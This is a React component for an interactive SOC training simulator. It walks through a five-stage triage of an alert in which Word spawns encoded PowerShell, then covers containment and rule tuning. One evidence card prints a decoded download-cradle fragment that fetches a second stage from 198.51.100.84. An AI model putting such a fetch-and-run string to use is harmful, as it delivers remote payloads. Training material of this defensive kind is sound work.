'use client';

import React, { useState, useEffect } from 'react';
import {
  Workflow,
  Play,
  Pause,
  RotateCcw,
  Shield,
  Search,
  AlertTriangle,
  Radio,
  Lock,
  Network,
  CheckCircle2,
  FileCheck2,
  Sparkles,
  ArrowRight,
  Database,
  Terminal,
  Activity,
  Zap,
  Clock,
  Eye,
  Cpu,
  Layers,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { motion, AnimatePresence } from 'framer-motion';

export interface ProcessStage {
  id: number;
  name: string;
  subtitle: string;
  mentor: string;
  color: string;
  badgeBg: string;
  borderColor: string;
  gradientBg: string;
  ticker: string;
  quote: string;
  actionText: string;
  stickers: {
    icon: React.ReactNode;
    label: string;
    sub: string;
    tag: string;
  }[];
}

const PROCESS_STAGES: ProcessStage[] = [
  {
    id: 1,
    name: 'Stage 1: Monitor & Ingest',
    subtitle: 'Queue Radar & Alert Ingress',
    mentor: 'Rajesh Kumar (Shift Mentor)',
    color: 'text-amber-700 dark:text-amber-400',
    badgeBg: 'bg-amber-500/15 text-amber-900 dark:text-amber-200 border-amber-400/40',
    borderColor: 'border-amber-300 dark:border-amber-800',
    gradientBg: 'from-amber-50/90 via-orange-50/40 to-slate-50 dark:from-amber-950/30 dark:via-orange-950/20 dark:to-slate-900/40',
    ticker: 'SIEM INGRESS: Alert SEC-2026-0412 Landed in Queue | SLA Clock Started: 15m 00s | Rule: Encoded PowerShell',
    quote: 'Rajesh: "Telemetry streams 24/7. When a rule fires, claim ownership quickly before the SLA clock runs out."',
    actionText: 'Claim Ownership & Start Investigation',
    stickers: [
      {
        icon: <Radio className="w-5 h-5 text-amber-600 dark:text-amber-400 animate-pulse" />,
        label: 'SIEM Queue Radar',
        sub: 'Event ID 4688 correlated with Sysmon 1',
        tag: 'Telemetry Ingress',
      },
      {
        icon: <Clock className="w-5 h-5 text-amber-600 dark:text-amber-400" />,
        label: '15-Minute SLA Clock',
        sub: 'Tier 1 response countdown actively ticking',
        tag: 'Metric Tracking',
      },
      {
        icon: <AlertTriangle className="w-5 h-5 text-rose-600 dark:text-rose-400" />,
        label: 'Alert SEC-2026-0412',
        sub: 'High Severity: Suspicious Process Spawning',
        tag: 'Triggered Rule',
      },
      {
        icon: <CheckCircle2 className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />,
        label: 'Analyst Claimed',
        sub: 'Ownership accepted by L1 Analyst on duty',
        tag: 'Procedural Signoff',
      },
    ],
  },
  {
    id: 2,
    name: 'Stage 2: Inspect & Extract',
    subtitle: 'Extracting the 5 Core Evidence Facts',
    mentor: 'Rajesh Kumar (Senior Guide)',
    color: 'text-sky-700 dark:text-sky-400',
    badgeBg: 'bg-sky-500/15 text-sky-900 dark:text-sky-200 border-sky-400/40',
    borderColor: 'border-sky-300 dark:border-sky-800',
    gradientBg: 'from-sky-50/90 via-blue-50/40 to-slate-50 dark:from-sky-950/30 dark:via-blue-950/20 dark:to-slate-900/40',
    ticker: 'EXTRACTION COMPLETE: User: mchen | Host: FIN-BOS-047 | Parent: WINWORD.EXE | Child: powershell.exe -enc',
    quote: 'Rajesh: "Never guess. Pull the 5 forensic facts: User, Host, Parent Process, Child Process, and Timestamp."',
    actionText: 'Decode Encoded Command & Verify Process Tree',
    stickers: [
      {
        icon: <Search className="w-5 h-5 text-sky-600 dark:text-sky-400" />,
        label: 'Process Tree Analysis',
        sub: 'WINWORD.EXE (PID 4820) spawned powershell.exe',
        tag: 'Parent-Child Link',
      },
      {
        icon: <Terminal className="w-5 h-5 text-indigo-600 dark:text-indigo-400" />,
        label: 'Base64 Decoded',
        sub: 'Decoded: DownloadString(http://198.51.100.84/stage2)',
        tag: 'Payload String',
      },
      {
        icon: <Database className="w-5 h-5 text-sky-600 dark:text-sky-400" />,
        label: 'Target Host Identity',
        sub: 'FIN-BOS-MCHEN-047 (IP: 10.20.4.88)',
        tag: 'Asset Context',
      },
      {
        icon: <Activity className="w-5 h-5 text-rose-600 dark:text-rose-400" />,
        label: 'External C2 Vector',
        sub: 'Outbound TCP connection to 198.51.100.84:443',
        tag: 'Network Artifact',
      },
    ],
  },
  {
    id: 3,
    name: 'Stage 3: Correlate & Baseline',
    subtitle: 'Checking Business Normal vs Malicious',
    mentor: 'Priya Sharma (Senior IR Lead)',
    color: 'text-purple-700 dark:text-purple-400',
    badgeBg: 'bg-purple-500/15 text-purple-900 dark:text-purple-200 border-purple-400/40',
    borderColor: 'border-purple-300 dark:border-purple-800',
    gradientBg: 'from-purple-50/90 via-violet-50/40 to-slate-50 dark:from-purple-950/30 dark:via-violet-950/20 dark:to-slate-900/40',
    ticker: 'BASELINE ANOMALY: Finance Department baseline has 0 PowerShell executions in 90 days. True Positive!',
    quote: 'Priya: "Does Michael Chen in Accounting ever write PowerShell? No. This abnormal deviation confirms a True Positive."',
    actionText: 'Confirm True Positive & Escalate to Tier 2',
    stickers: [
      {
        icon: <Layers className="w-5 h-5 text-purple-600 dark:text-purple-400" />,
        label: '90-Day Peer Baseline',
        sub: 'Finance group baseline: zero scripting activity',
        tag: 'Role Norm',
      },
      {
        icon: <Shield className="w-5 h-5 text-purple-600 dark:text-purple-400" />,
        label: 'Threat Intel Match',
        sub: 'C2 IP flagged in VirusTotal by 58 security vendors',
        tag: 'IOC Reputation',
      },
      {
        icon: <Eye className="w-5 h-5 text-amber-600 dark:text-amber-400" />,
        label: 'Not Burnt Toast',
        sub: 'Confirmed malicious payload, NOT benign system activity',
        tag: 'Verdict Decision',
      },
      {
        icon: <Sparkles className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />,
        label: 'Clean Evidence Packet',
        sub: 'Complete evidence handoff prepared for Tier 2 IR',
        tag: 'Warm Handover',
      },
    ],
  },
  {
    id: 4,
    name: 'Stage 4: Respond & Contain',
    subtitle: 'Emergency Network & Credential Severance',
    mentor: 'Priya Sharma (Senior IR Lead)',
    color: 'text-rose-700 dark:text-rose-400',
    badgeBg: 'bg-rose-500/15 text-rose-900 dark:text-rose-200 border-rose-400/40',
    borderColor: 'border-rose-300 dark:border-rose-800',
    gradientBg: 'from-rose-50/90 via-red-50/40 to-slate-50 dark:from-rose-950/30 dark:via-red-950/20 dark:to-slate-900/40',
    ticker: 'CONTAINMENT ACTIVE: Host Isolated | Kerberos Tickets Killed | Firewall Block Rule Injected',
    quote: 'Priya: "Sever the wire first! Cut off the attacker from the corporate network before they pivot laterally."',
    actionText: 'Execute Host Isolation & Perimeter Firewall Block',
    stickers: [
      {
        icon: <Lock className="w-5 h-5 text-rose-600 dark:text-rose-400" />,
        label: 'EDR Host Isolation',
        sub: 'Host FIN-BOS-047 disconnected from LAN instantly',
        tag: 'Containment',
      },
      {
        icon: <Cpu className="w-5 h-5 text-rose-600 dark:text-rose-400" />,
        label: 'Session Termination',
        sub: 'Active Directory Kerberos token revoked',
        tag: 'Identity Lock',
      },
      {
        icon: <Network className="w-5 h-5 text-rose-600 dark:text-rose-400" />,
        label: 'Perimeter Block Rule',
        sub: 'Malicious IP 198.51.100.84 blacklisted on firewall',
        tag: 'Network Block',
      },
      {
        icon: <Shield className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />,
        label: 'Lateral Move Thwarted',
        sub: 'Zero hops reached Domain Controller or internal servers',
        tag: 'Safe Perimeter',
      },
    ],
  },
  {
    id: 5,
    name: 'Stage 5: Record & Share',
    subtitle: 'Incident Dossier & Detection Tuning',
    mentor: 'Rajesh Kumar (Senior Mentor)',
    color: 'text-emerald-700 dark:text-emerald-400',
    badgeBg: 'bg-emerald-500/15 text-emerald-900 dark:text-emerald-200 border-emerald-400/40',
    borderColor: 'border-emerald-300 dark:border-emerald-800',
    gradientBg: 'from-emerald-50/90 via-teal-50/40 to-slate-50 dark:from-emerald-950/30 dark:via-teal-950/20 dark:to-slate-900/40',
    ticker: 'AUDIT SEAL: Dossier Stored | MTTD: 3m | MTTR: 11m | Detection Rule Tuned for Word Spawn Protection',
    quote: 'Rajesh: "If it is not written in the ticket, it never happened. Detailed notes help engineers tune the rules."',
    actionText: 'Save Case Dossier & Update Detection Rules',
    stickers: [
      {
        icon: <FileCheck2 className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />,
        label: 'Incident Dossier',
        sub: 'Full forensic timeline & IOC catalog archived',
        tag: 'Compliance Audit',
      },
      {
        icon: <Clock className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />,
        label: 'MTTD & MTTR Metrics',
        sub: 'Detected in 3 mins, fully contained in 11 mins',
        tag: 'SLA Success',
      },
      {
        icon: <Zap className="w-5 h-5 text-amber-600 dark:text-amber-400" />,
        label: 'Rule Tuning Update',
        sub: 'Added auto-block for office applications spawning CLI',
        tag: 'System Defense',
      },
      {
        icon: <CheckCircle2 className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />,
        label: 'Ticket Closed Cleanly',
        sub: 'Executive sign-off received & user machine remediated',
        tag: 'Case Resolved',
      },
    ],
  },
];

interface UnifiedProcessSimulatorProps {
  onStageChange?: (stageId: number) => void;
}

export function UnifiedProcessSimulator({ onStageChange }: UnifiedProcessSimulatorProps) {
  const [activeStageId, setActiveStageId] = useState<number>(1);
  const [isPlaying, setIsPlaying] = useState<boolean>(true);
  const [progressPercent, setProgressPercent] = useState<number>(0);

  const currentStage = PROCESS_STAGES.find((s) => s.id === activeStageId) || PROCESS_STAGES[0];

  // Autoplay timer with smooth progress bar
  useEffect(() => {
    if (!isPlaying) {
      setProgressPercent(0);
      return;
    }

    const duration = 6000; // 6 seconds per stage
    const intervalTime = 50;
    const increment = (intervalTime / duration) * 100;

    const timer = setInterval(() => {
      setProgressPercent((prev) => {
        if (prev >= 100) {
          setActiveStageId((curr) => {
            const next = curr >= PROCESS_STAGES.length ? 1 : curr + 1;
            if (onStageChange) onStageChange(next);
            return next;
          });
          return 0;
        }
        return prev + increment;
      });
    }, intervalTime);

    return () => clearInterval(timer);
  }, [isPlaying, activeStageId, onStageChange]);

  const handleSelectStage = (id: number) => {
    setActiveStageId(id);
    setProgressPercent(0);
    if (onStageChange) onStageChange(id);
  };

  const handleTogglePlay = () => {
    setIsPlaying(!isPlaying);
  };

  const handleReset = () => {
    setActiveStageId(1);
    setProgressPercent(0);
    setIsPlaying(true);
    if (onStageChange) onStageChange(1);
  };

  return (
    <div className="glass-card glass-glossy rounded-3xl border-2 border-white/70 dark:border-white/10 p-4 sm:p-6 shadow-xl backdrop-blur-3xl overflow-hidden relative transition-all duration-300">
      {/* Dynamic ambient background glow */}
      <div className="absolute top-0 right-0 w-80 h-80 bg-gradient-to-bl from-primary/10 via-amber-500/10 to-transparent rounded-full blur-3xl pointer-events-none -z-10" />

      {/* TOP BAR CONTROLS (Video Player Console Style) */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-border/60 pb-3">
        {/* Left: Video Title & Live Status */}
        <div className="flex items-center gap-2.5">
          <div className="w-8 h-8 rounded-xl bg-primary/15 text-primary flex items-center justify-center shrink-0">
            <Workflow className="w-4 h-4" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="font-extrabold text-sm sm:text-base text-foreground tracking-tight">
                Alert Triage Lifecycle Simulator
              </span>
              <Badge variant="outline" className="text-[10px] bg-emerald-500/15 text-emerald-900 dark:text-emerald-200 border-emerald-400/40 font-bold py-0.5">
                {isPlaying ? '● Live Stream' : '❚❚ Paused'}
              </Badge>
            </div>
            <p className="text-[11px] text-muted-foreground font-medium hidden sm:block">
              5-Stage Interactive Video Demo • Auto-advancing with live operational vector cards
            </p>
          </div>
        </div>

        {/* Right: Player Controls (Play, Pause, Reset) */}
        <div className="flex items-center gap-2 shrink-0">
          <Button
            variant="outline"
            size="sm"
            onClick={handleTogglePlay}
            className="h-8 px-2.5 text-xs font-bold gap-1.5 rounded-xl glass-pill cursor-pointer border-border/80"
          >
            {isPlaying ? (
              <>
                <Pause className="w-3.5 h-3.5 text-amber-600" />
                <span className="text-[11px]">Pause</span>
              </>
            ) : (
              <>
                <Play className="w-3.5 h-3.5 text-emerald-600" />
                <span className="text-[11px]">Play</span>
              </>
            )}
          </Button>

          <Button
            variant="ghost"
            size="sm"
            onClick={handleReset}
            className="h-8 w-8 p-0 rounded-xl glass-pill text-muted-foreground hover:text-foreground cursor-pointer"
            title="Restart from Stage 1"
          >
            <RotateCcw className="w-3.5 h-3.5" />
          </Button>
        </div>
      </div>

      {/* STAGE SELECTOR TABS (Apple Segmented Glass Control) */}
      <div className="grid grid-cols-5 gap-1.5 sm:gap-2 my-3 p-1 rounded-2xl bg-black/5 dark:bg-white/5 border border-border/40">
        {PROCESS_STAGES.map((s) => {
          const isActive = s.id === activeStageId;
          return (
            <button
              key={s.id}
              onClick={() => handleSelectStage(s.id)}
              className={`py-1.5 px-1 sm:px-2 rounded-xl text-center transition-all duration-200 cursor-pointer flex flex-col items-center justify-center ${
                isActive
                  ? 'bg-card text-foreground font-black shadow-md border border-white/60 dark:border-white/10 scale-[1.02]'
                  : 'text-muted-foreground hover:text-foreground font-semibold hover:bg-black/5 dark:hover:bg-white/5'
              }`}
            >
              <span className="text-[10px] sm:text-xs">Stage {s.id}</span>
              <span className="text-[9px] sm:text-[10px] opacity-75 truncate max-w-full hidden md:block">
                {s.name.split(':')[1]?.trim() || s.name}
              </span>
            </button>
          );
        })}
      </div>

      {/* CONTINUOUS PROGRESS SCRUBBER */}
      <div className="w-full h-1.5 bg-black/5 dark:bg-white/5 rounded-full overflow-hidden mb-4">
        <div
          className="h-full bg-gradient-to-r from-primary to-amber-500 rounded-full transition-all duration-75"
          style={{ width: `${progressPercent}%` }}
        />
      </div>

      {/* MAIN VIDEO FRAME: SINGLE CLEAN GLASS CONTAINER */}
      <AnimatePresence mode="wait">
        <motion.div
          key={currentStage.id}
          initial={{ opacity: 0, y: 10, filter: 'blur(6px)' }}
          animate={{ opacity: 1, y: 0, filter: 'blur(0px)' }}
          exit={{ opacity: 0, y: -10, filter: 'blur(6px)' }}
          transition={{ duration: 0.25, ease: [0.16, 1, 0.3, 1] }}
          className={`rounded-2xl border ${currentStage.borderColor} bg-gradient-to-br ${currentStage.gradientBg} p-4 sm:p-5 space-y-4 shadow-sm backdrop-blur-2xl transition-all`}
        >
          {/* Header Row: Stage Name + Ticker + Mentor Tag */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-border/50 pb-3">
            <div>
              <div className="flex items-center gap-2">
                <Badge className={currentStage.badgeBg}>
                  Stage {currentStage.id} of 5
                </Badge>
                <h3 className={`font-black text-base sm:text-lg ${currentStage.color}`}>
                  {currentStage.name}
                </h3>
              </div>
              <p className="text-xs text-muted-foreground font-semibold mt-0.5">
                {currentStage.subtitle}
              </p>
            </div>

            <div className="text-left sm:text-right">
              <span className="text-[10px] uppercase font-bold tracking-wider text-muted-foreground block">
                Guide on Shift
              </span>
              <span className="text-xs font-extrabold text-foreground">
                {currentStage.mentor}
              </span>
            </div>
          </div>

          {/* STRICT 1-3 LINES DIALOGUE / MENTOR VOICE (Rule Compliant) */}
          <div className="p-3 sm:p-3.5 rounded-xl bg-card/85 dark:bg-card/50 border border-border/70 backdrop-blur-md shadow-xs flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-primary/10 text-primary flex items-center justify-center shrink-0">
              <Sparkles className="w-4 h-4" />
            </div>
            <p className="text-xs sm:text-sm text-foreground/90 font-medium leading-relaxed italic">
              {currentStage.quote}
            </p>
          </div>

          {/* 4 GRAPHICAL VECTOR STICKERS / OPERATIONAL CARDS */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {currentStage.stickers.map((stk, idx) => (
              <div
                key={idx}
                className="p-3 rounded-xl bg-card/80 dark:bg-slate-900/60 border border-border/70 shadow-xs hover:border-primary/50 transition-all space-y-1.5 flex flex-col justify-between"
              >
                <div className="flex items-center justify-between">
                  <div className="w-8 h-8 rounded-lg bg-black/5 dark:bg-white/5 flex items-center justify-center shrink-0">
                    {stk.icon}
                  </div>
                  <Badge variant="outline" className="text-[9px] bg-black/5 dark:bg-white/5 font-semibold py-0.5">
                    {stk.tag}
                  </Badge>
                </div>
                <div>
                  <h4 className="font-extrabold text-xs text-foreground tracking-tight">
                    {stk.label}
                  </h4>
                  <p className="text-[11px] text-muted-foreground leading-snug line-clamp-2 mt-0.5">
                    {stk.sub}
                  </p>
                </div>
              </div>
            ))}
          </div>

          {/* LIVE TICKER CONSOLE STRIP */}
          <div className="p-2 sm:p-2.5 rounded-xl bg-card/90 dark:bg-black/40 border border-border/80 flex items-center justify-between gap-2 overflow-hidden">
            <div className="flex items-center gap-2 min-w-0">
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping shrink-0" />
              <span className="text-[10px] sm:text-xs font-mono font-bold text-foreground truncate">
                {currentStage.ticker}
              </span>
            </div>
            <div className="flex items-center gap-1 shrink-0">
              <Button
                size="sm"
                variant="ghost"
                onClick={() => {
                  const next = currentStage.id >= PROCESS_STAGES.length ? 1 : currentStage.id + 1;
                  handleSelectStage(next);
                }}
                className="h-6 px-2 text-[10px] font-bold text-primary hover:text-primary/90 hover:bg-primary/10 gap-1 rounded-lg"
              >
                <span>Step {currentStage.id < 5 ? currentStage.id + 1 : 1}</span>
                <ArrowRight className="w-3 h-3" />
              </Button>
            </div>
          </div>
        </motion.div>
      </AnimatePresence>
    </div>
  );
}
